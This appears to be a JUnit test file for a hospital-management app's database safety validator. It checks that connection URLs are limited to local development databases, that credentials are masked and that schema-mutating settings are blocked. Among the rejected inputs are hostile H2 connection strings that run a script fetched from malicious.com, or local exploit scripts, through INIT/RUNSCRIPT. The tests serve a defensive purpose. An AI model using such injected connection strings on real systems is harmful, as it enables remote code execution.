package com.harsh.hospitalmanagement.config.safety;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DatabaseSafetyValidatorTest {

    @Nested
    @DisplayName("Datasource URL Validation")
    class UrlValidationTests {

        @ParameterizedTest
        @NullAndEmptySource
        @ValueSource(strings = {"   ", "\t", "\n"})
        @DisplayName("Missing or blank URL fails closed")
        void missingUrlFailsClosed(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("Database connection URL is missing");
        }

        @Test
        @DisplayName("Targeting hospital_management database is strictly rejected")
        void rejectHospitalManagement() {
            String url = "jdbc:postgresql://localhost:5433/hospital_management";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL DATABASE SAFETY VIOLATION")
                    .hasMessageContaining("hospital_management");
        }

        @Test
        @DisplayName("URL containing hospital_management anywhere is strictly rejected")
        void rejectHospitalManagementAnywhere() {
            String url = "jdbc:postgresql://localhost:5433/hms_dev_test?extra=hospital_management";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL DATABASE SAFETY VIOLATION");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://localhost:5433/hms_dev_safe?PGDBNAME=hospital%5Fmanagement",
                "jdbc:postgresql://localhost:5433/hms_dev_safe?pgdbname=hospital_management",
                "jdbc:postgresql://localhost:5433/hms_dev_safe?database=hospital_management",
                "jdbc:postgresql://localhost:5433/hms_dev_safe?PGHOST=remote.server.com",
                "jdbc:postgresql://localhost:5433/hms_dev_safe?pgport=5432",
                "jdbc:postgresql://localhost:5433/hms_dev_safe?currentSchema=public"
        })
        @DisplayName("Query parameter overrides targeting host, port, db, or schema are strictly rejected")
        void rejectQueryParameterOverrides(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class);
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://localhost:5433/hospital%5Fmanagement",
                "jdbc:postgresql://localhost:5433/hospital%255fmanagement",
                "jdbc:postgresql://localhost:5433/HOSPITAL%5fMANAGEMENT",
                "jdbc:postgresql://localhost:5433/%68%6f%73%70%69%74%61%6c%5f%6d%61%6e%61%67%65%6d%65%6e%74"
        })
        @DisplayName("Percent-encoded representations of hospital_management are decoded and rejected")
        void rejectPercentEncodedHospitalManagement(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL DATABASE SAFETY VIOLATION");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://localhost:5433/postgres",
                "jdbc:postgresql://localhost:5433/hms_production",
                "jdbc:postgresql://localhost:5433/testdb",
                "jdbc:postgresql://localhost:5433/hms_dev_", // missing suffix
                "jdbc:postgresql://localhost:5433/hms_reconcile_validation_20261114",
                "jdbc:postgresql://localhost:5433/dev_hms",
                "jdbc:postgresql://localhost:5433/hms_dev-test" // hyphen not allowed in identifier regex
        })
        @DisplayName("Non-allowlisted database names are rejected")
        void rejectNonAllowlistedDatabases(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("safety constraints");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://localhost:5433/hms_dev_test",
                "jdbc:postgresql://127.0.0.1:5433/hms_dev_sandbox",
                "jdbc:postgresql://[::1]:5433/hms_dev_20261114_224500_a1b2c3d4",
                "jdbc:postgresql://localhost:5433/hms_dev_e2e?ssl=false"
        })
        @DisplayName("Allowlisted hms_dev_* databases on localhost:5433 pass validation")
        void acceptAllowlistedDatabases(String url) {
            assertThatCode(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .doesNotThrowAnyException();
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://localhost:5432/hms_dev_test",
                "jdbc:postgresql://localhost:5434/hms_dev_test",
                "jdbc:postgresql://localhost:15433/hms_dev_test"
        })
        @DisplayName("Wrong ports are rejected (only port 5433 allowed)")
        void rejectWrongPort(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("Database port")
                    .hasMessageContaining("5433");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://remote-host:5433/hms_dev_test",
                "jdbc:postgresql://192.168.1.50:5433/hms_dev_test",
                "jdbc:postgresql://10.0.0.1:5433/hms_dev_test",
                "jdbc:postgresql://db.hospital.internal:5433/hms_dev_test"
        })
        @DisplayName("Non-local hosts are rejected (only localhost allowed)")
        void rejectNonLocalHost(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("Database host");
        }

        @Test
        @DisplayName("Multiple hosts in PostgreSQL URL are rejected")
        void rejectMultipleHosts() {
            String url = "jdbc:postgresql://localhost:5433,127.0.0.1:5433/hms_dev_test";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("Multiple host specifications are not permitted");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://localhost:5433/hms_dev_test/extra",
                "jdbc:postgresql://localhost:5433/hms_dev_test\\extra",
                "jdbc:postgresql://localhost:5433/hms_dev_test..extra"
        })
        @DisplayName("Path traversal or nested slashes in database name are rejected")
        void rejectPathTraversal(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class);
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:mysql://localhost:3306/hms_dev_test",
                "jdbc:oracle:thin:@localhost:1521:xe",
                "jdbc:sqlserver://localhost:1433;databaseName=hms_dev_test"
        })
        @DisplayName("Unsupported JDBC protocols are rejected")
        void rejectUnsupportedProtocols(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("Unsupported JDBC protocol");
        }

        @Test
        @DisplayName("File-based H2 databases are rejected")
        void rejectFileBasedH2() {
            String url = "jdbc:h2:file:./data/hms_dev_test";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("File-based H2 databases are not permitted");
        }

        @Test
        @DisplayName("In-memory H2 databases are accepted for test contexts")
        void acceptInMemoryH2() {
            String url = "jdbc:h2:mem:hospital_test;DB_CLOSE_DELAY=-1;MODE=PostgreSQL";
            assertThatCode(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("In-memory H2 referencing hospital_management is strictly rejected")
        void rejectInMemoryH2WithHospitalManagement() {
            String url = "jdbc:h2:mem:hospital_management;DB_CLOSE_DELAY=-1";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL DATABASE SAFETY VIOLATION");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://malicious.com/attack.sql'",
                "jdbc:h2:mem:test;RUNSCRIPT=./exploit.sql",
                "jdbc:h2:mem:test;INIT=CREATE SCHEMA audit_marker",
                "jdbc:h2:mem:test;init=create table evil (id int)",
                "jdbc:h2:mem:test;INIT=CREATE LINKED TABLE t()",
                "jdbc:h2:mem:test;FORBIDDEN_PARAM=123"
        })
        @DisplayName("H2 RUNSCRIPT, INIT, LINKED, or non-allowlisted parameters are strictly rejected")
        void rejectH2Runscript(String url) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url))
                    .isInstanceOf(DatabaseSafetyException.class);
        }

        @Test
        @DisplayName("sanitizeUrl masks passwords and user credentials, including passwords with colons and without leading //")
        void sanitizeUrlMasksCredentials() {
            String rawWithDoubleSlash = "jdbc:postgresql://adminUser:secret:pass:with:colons@localhost:5433/hms_dev_test?password=superSecret&user=adminUser";
            String sanitized1 = DatabaseSafetyValidator.sanitizeUrl(rawWithDoubleSlash);
            assertThat(sanitized1).doesNotContain("secret:pass:with:colons");
            assertThat(sanitized1).doesNotContain("superSecret");
            assertThat(sanitized1).contains("<credentials-masked>");
            assertThat(sanitized1).contains("password=***");
            assertThat(sanitized1).contains("user=***");

            // Standalone host string without // (e.g. effective host from driver parseURL)
            String standaloneHost = "adminUser:secret:pass:with:colons@remote.destination.com:5433";
            String sanitized2 = DatabaseSafetyValidator.sanitizeUrl(standaloneHost);
            assertThat(sanitized2).doesNotContain("secret:pass:with:colons");
            assertThat(sanitized2).doesNotContain("adminUser");
            assertThat(sanitized2).contains("<credentials-masked>@remote.destination.com:5433");

            // Encoded credentials
            String encodedCreds = "user%3Aname:pass%40word@remotehost:5433";
            String sanitized3 = DatabaseSafetyValidator.sanitizeUrl(encodedCreds);
            assertThat(sanitized3).doesNotContain("pass%40word");
            assertThat(sanitized3).contains("<credentials-masked>@remotehost:5433");
        }

        @Test
        @DisplayName("stripUserInfoFromJdbcUrl removes credentials while preserving destination")
        void stripUserInfoRemovesCredentials() {
            String url = "jdbc:postgresql://adminUser:secret:pass:with:colons@localhost:5433/hms_dev_test?ssl=false";
            String stripped = DatabaseSafetyValidator.stripUserInfoFromJdbcUrl(url);
            assertThat(stripped).isEqualTo("jdbc:postgresql://localhost:5433/hms_dev_test?ssl=false");
            assertThat(stripped).doesNotContain("adminUser");
            assertThat(stripped).doesNotContain("secret:pass:with:colons");

            // Query parameter credentials stripped cleanly while preserving other query params
            String queryUrl = "jdbc:postgresql://localhost:5433/hms_dev_test?user=auditUser&password=auditSecret%ZZ&targetServerType=primary";
            String strippedQuery = DatabaseSafetyValidator.stripUserInfoFromJdbcUrl(queryUrl);
            assertThat(strippedQuery).isEqualTo("jdbc:postgresql://localhost:5433/hms_dev_test?targetServerType=primary");
            assertThat(strippedQuery).doesNotContain("auditUser");
            assertThat(strippedQuery).doesNotContain("auditSecret");

            // URL with only query credentials becomes base URL without trailing delimiter
            String onlyCreds = "jdbc:postgresql://localhost:5433/hms_dev_test?password=foo:bar@baz%20";
            String strippedOnly = DatabaseSafetyValidator.stripUserInfoFromJdbcUrl(onlyCreds);
            assertThat(strippedOnly).isEqualTo("jdbc:postgresql://localhost:5433/hms_dev_test");
        }

        @Test
        @DisplayName("Validation exception for URL with semicolon credentials never exposes credentials and rejects semicolon database path")
        void validationExceptionForSemicolonCredentialsNeverExposesSecrets() {
            String semicolonUrl = "jdbc:postgresql://localhost:5433/hms_dev_test;password=semiSecretPassword123";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(semicolonUrl))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .satisfies(ex -> {
                        assertThat(ex.getMessage()).doesNotContain("semiSecretPassword123");
                        assertThat(ex.getMessage()).contains("password=***");
                        assertThat(ex.getMessage()).contains("violates safety constraints");
                        if (ex.getCause() != null) {
                            assertThat(ex.getCause().getMessage()).doesNotContain("semiSecretPassword123");
                        }
                    });
        }

        @Test
        @DisplayName("Actual validation exceptions and causes never disclose usernames or passwords")
        void validationExceptionsNeverDiscloseCredentials() {
            String remoteUrl = "jdbc:postgresql://leakedUser:leakedSecret123@remote.badhost.com:5433/hms_dev_test";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(remoteUrl))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .satisfies(ex -> {
                        assertThat(ex.getMessage()).doesNotContain("leakedUser");
                        assertThat(ex.getMessage()).doesNotContain("leakedSecret123");
                        if (ex.getCause() != null) {
                            assertThat(ex.getCause().getMessage()).doesNotContain("leakedUser");
                            assertThat(ex.getCause().getMessage()).doesNotContain("leakedSecret123");
                        }
                    });

            String colonPassUrl = "jdbc:postgresql://colonUser:pass:with:multiple:colons@remote.badhost.com:5433/hms_dev_test";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(colonPassUrl))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .satisfies(ex -> {
                        assertThat(ex.getMessage()).doesNotContain("colonUser");
                        assertThat(ex.getMessage()).doesNotContain("pass:with:multiple:colons");
                    });

            String forbiddenDbWithCreds = "jdbc:postgresql://authAdmin:authSecret@localhost:5433/hospital_management";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(forbiddenDbWithCreds))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .satisfies(ex -> {
                        assertThat(ex.getMessage()).doesNotContain("authAdmin");
                        assertThat(ex.getMessage()).doesNotContain("authSecret");
                    });

            String queryCredsUrl = "jdbc:postgresql://remote.badhost.com:5433/hms_dev_test?user=queryUser&password=querySecret";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(queryCredsUrl))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .satisfies(ex -> {
                        assertThat(ex.getMessage()).doesNotContain("queryUser");
                        assertThat(ex.getMessage()).doesNotContain("querySecret");
                        if (ex.getCause() != null) {
                            assertThat(ex.getCause().getMessage()).doesNotContain("queryUser");
                            assertThat(ex.getCause().getMessage()).doesNotContain("querySecret");
                        }
                    });

            // Semicolon-delimited credentials on invalid DB name are sanitized and never exposed in exception
            String semicolonUrl = "jdbc:postgresql://localhost:5433/invalid_db;password=semiSecretPassword123";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(semicolonUrl))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .satisfies(ex -> {
                        assertThat(ex.getMessage()).doesNotContain("semiSecretPassword123");
                        if (ex.getCause() != null) {
                            assertThat(ex.getCause().getMessage()).doesNotContain("semiSecretPassword123");
                        }
                    });
        }
    }

    @Nested
    @DisplayName("Hibernate & Jakarta Schema Action Validation")
    class SchemaActionValidationTests {

        @ParameterizedTest
        @ValueSource(strings = {"validate", "VALIDATE", "none", "NONE"})
        @DisplayName("Safe DDL modes ('validate', 'none') pass for PostgreSQL")
        void acceptSafeDdlModes(String mode) {
            assertThatCode(() -> DatabaseSafetyValidator.validateDdlAuto(mode, false))
                    .doesNotThrowAnyException();
        }

        @ParameterizedTest
        @ValueSource(strings = {"update", "create", "create-drop", "create-only", "drop", "drop-and-create"})
        @DisplayName("Mutating DDL modes are strictly rejected for PostgreSQL across property variants")
        void rejectMutatingDdlModes(String mode) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDdlAuto(mode, false))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL SCHEMA SAFETY VIOLATION")
                    .hasMessageContaining(mode);

            assertThatThrownBy(() -> DatabaseSafetyValidator.validateSchemaAction("hibernate.hbm2ddl.auto", mode, false))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL SCHEMA SAFETY VIOLATION");

            assertThatThrownBy(() -> DatabaseSafetyValidator.validateSchemaAction("jakarta.persistence.schema-generation.database.action", mode, false))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL SCHEMA SAFETY VIOLATION");
        }

        @ParameterizedTest
        @ValueSource(strings = {"create-drop", "create", "update", "validate"})
        @DisplayName("H2 in-memory is permitted create-drop for test harnesses")
        void acceptDdlModesForH2Mem(String mode) {
            assertThatCode(() -> DatabaseSafetyValidator.validateDdlAuto(mode, true))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("validateJpaProperties inspects full map and rejects mutating actions")
        void validateJpaPropertiesRejectsMutations() {
            Map<String, Object> props = Map.of(
                    "hibernate.hbm2ddl.auto", "create",
                    "hibernate.dialect", "org.hibernate.dialect.PostgreSQLDialect"
            );
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateJpaProperties(props, false))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL SCHEMA SAFETY VIOLATION");
        }
    }

    @Nested
    @DisplayName("Production Profile Safety Validation")
    class ProductionModeValidationTests {

        @Test
        @DisplayName("Valid managed Neon cloud PostgreSQL URL is permitted in production mode")
        void permitValidNeonUrlInProduction() {
            String neonUrl = "jdbc:postgresql://ep-round-flower-12345.us-east-2.aws.neon.tech:5432/neondb?sslmode=require";
            assertThatCode(() -> DatabaseSafetyValidator.validateDataSourceUrl(neonUrl, true))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("hospital_management database is strictly rejected in production mode")
        void rejectHospitalManagementInProduction() {
            String forbiddenUrl = "jdbc:postgresql://ep-round-flower-12345.us-east-2.aws.neon.tech:5432/hospital_management";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(forbiddenUrl, true))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL DATABASE SAFETY VIOLATION")
                    .hasMessageContaining("hospital_management");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "jdbc:postgresql://127.0.0.1:5433/hms_dev_safe",
                "jdbc:postgresql://127.0.0.2:5433/hms_dev_safe",
                "jdbc:postgresql://127.1.2.3:5433/hms_dev_safe",
                "jdbc:postgresql://localhost:5433/hms_dev_safe",
                "jdbc:postgresql://[::1]:5433/hms_dev_safe",
                "jdbc:postgresql://0.0.0.0:5433/hms_dev_safe",
                "jdbc:postgresql://[::]:5433/hms_dev_safe"
        })
        @DisplayName("Local loopback and wildcard destinations are strictly rejected in production mode")
        void rejectLoopbackInProduction(String localUrl) {
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(localUrl, true))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL PRODUCTION SAFETY VIOLATION");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "localhost",
                "127.0.0.1",
                "127.0.0.2",
                "127.255.255.254",
                "::1",
                "[::1]",
                "0.0.0.0",
                "::",
                "[::]"
        })
        @DisplayName("isLoopbackHost correctly identifies all loopback and wildcard variants")
        void testIsLoopbackHostTrue(String host) {
            assertThat(DatabaseSafetyValidator.isLoopbackHost(host)).isTrue();
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "ep-round-flower-12345.us-east-2.aws.neon.tech",
                "192.168.1.1",
                "10.0.0.1",
                "example.com"
        })
        @DisplayName("isLoopbackHost returns false for non-loopback hosts")
        void testIsLoopbackHostFalse(String host) {
            assertThat(DatabaseSafetyValidator.isLoopbackHost(host)).isFalse();
        }

        @Test
        @DisplayName("Multi-host URL with userInfo hiding localhost destination is rejected in production")
        void rejectMultiHostWithUserinfoHidingLocalhostInProduction() {
            String url = "jdbc:postgresql://localhost:5433,user@cloud.invalid:5432/neondb";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url, true))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL PRODUCTION SAFETY VIOLATION");
        }

        @Test
        @DisplayName("Multi-host URL with userInfo on first localhost host is rejected in production")
        void rejectMultiHostWithUserinfoFirstHostInProduction() {
            String url = "jdbc:postgresql://user:pass@localhost:5433,cloud.invalid:5432/neondb";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(url, true))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("CRITICAL PRODUCTION SAFETY VIOLATION");
        }

        @Test
        @DisplayName("Remote Neon URL is rejected in local development mode")
        void rejectNeonUrlInLocalMode() {
            String neonUrl = "jdbc:postgresql://ep-round-flower-12345.us-east-2.aws.neon.tech:5432/neondb";
            assertThatThrownBy(() -> DatabaseSafetyValidator.validateDataSourceUrl(neonUrl, false))
                    .isInstanceOf(DatabaseSafetyException.class)
                    .hasMessageContaining("Database host");
        }
    }
}
